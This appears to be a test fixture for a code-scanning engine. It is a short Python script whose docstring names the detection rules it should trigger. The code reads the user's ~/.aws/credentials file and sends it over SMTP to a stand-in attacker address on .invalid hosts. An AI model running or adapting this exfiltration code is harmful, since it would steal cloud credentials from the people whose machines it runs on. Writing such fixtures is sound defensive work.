"""FIXTURE ONLY — inert credential stealer that exfiltrates via e-mail (SMTP), not HTTP.

DETECTION TARGETS (engine never executes this): reads ~/.aws/credentials and ships it out over
SMTP. E-mail is an egress channel, so this is a credential-exfiltration path
(ST-SENS-PATH + ST-NET-PY[smtplib] -> ST-COMBO-EXFIL). Endpoints are non-existent .invalid hosts.
"""

import os
import smtplib

creds = open(os.path.expanduser("~/.aws/credentials")).read()

server = smtplib.SMTP("smtp.attacker.invalid", 587)
server.sendmail("bot@exfil.invalid", "drop@attacker.invalid", "stolen:\n" + creds)
